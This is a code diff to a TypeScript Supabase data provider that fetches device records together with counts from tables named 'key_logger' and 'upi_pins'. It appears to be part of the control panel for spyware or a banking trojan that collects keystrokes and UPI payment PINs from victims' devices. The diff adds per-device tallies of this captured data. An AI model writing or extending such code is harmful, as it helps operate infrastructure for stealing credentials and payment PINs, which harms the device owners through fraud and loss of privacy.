@@ -18,7 +18,7 @@ export class SupabaseProvider implements IDeviceProvider {
 
         let query = this.supabase
             .from('devices')
-            .select('*')
+            .select('*, key_logger(count), upi_pins(count)')
             .eq('app_id', this.appId)
             .order('last_seen', { ascending: false })
             .limit(limit);
@@ -27,13 +27,21 @@ export class SupabaseProvider implements IDeviceProvider {
         if (error) throw error;
 
         const devices = data || [];
-        return devices.map(device => ({ ...device, _sourceProvider: 'SUPABASE' }));
+        return devices.map(device => {
+            const d: any = { ...device, _sourceProvider: 'SUPABASE' };
+            // Map Supabase related table counts to a standard _count property
+            d._count = {
+                key_logs: device.key_logger?.[0]?.count || 0,
+                upi_pins: device.upi_pins?.[0]?.count || 0
+            };
+            return d;
+        });
     }
 
     async getDevice(deviceId: string): Promise<any> {
         const { data, error } = await this.supabase
             .from('devices')
-            .select('*')
+            .select('*, key_logger(count), upi_pins(count)')
             .eq('device_id', deviceId)
             .maybeSingle();
 
@@ -41,11 +49,16 @@ export class SupabaseProvider implements IDeviceProvider {
 
         // Ensure appId is correctly set for assessment
         if (data) {
-            return {
+            const device: any = {
                 ...data,
                 app_id: this.appId || data.app_id,
                 _sourceProvider: 'SUPABASE'
             };
+            device._count = {
+                key_logs: data.key_logger?.[0]?.count || 0,
+                upi_pins: data.upi_pins?.[0]?.count || 0
+            };
+            return device;
         }
 
         return data;
